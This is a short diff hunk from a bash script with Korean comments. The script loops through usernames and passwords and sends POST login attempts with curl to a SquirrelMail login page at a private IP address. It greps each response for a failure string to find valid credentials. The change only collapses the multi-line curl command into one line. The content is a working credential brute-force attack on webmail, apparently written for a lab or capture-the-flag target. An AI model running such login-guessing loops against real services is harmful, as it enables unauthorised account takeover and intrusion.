@@ -50,10 +50,7 @@ for u in $(cat $USER_FILE); do
     # -s: Silent 모드 (진행률 표시 숨김)
     # -d: POST 데이터 전송 (application/x-www-form-urlencoded)
     # -q: grep 쿼리 옵션 (출력 없이 상태 코드만 반환)
-    curl -s -X POST "http://10.48.183.145/squirrelmail/src/redirect.php" \
-      -d "login_username=$u&secretkey=$p&js_autodetect_results=1&just_logged_in=1" \
-      -H "Content-Type: application/x-www-form-urlencoded" \
-      | grep -q "$FAILURE_STRING"
+    curl -s -X POST "http://10.48.183.145/squirrelmail/src/redirect.php" -d "login_username=$u&secretkey=$p&js_autodetect_results=1&just_logged_in=1" -H "Content-Type: application/x-www-form-urlencoded" | grep -q "$FAILURE_STRING"
 
     # grep의 Exit Code 확인
     # $? = 0 이면: 문자열을 찾았음 (로그인 실패) -> 아무것도 하지 않음
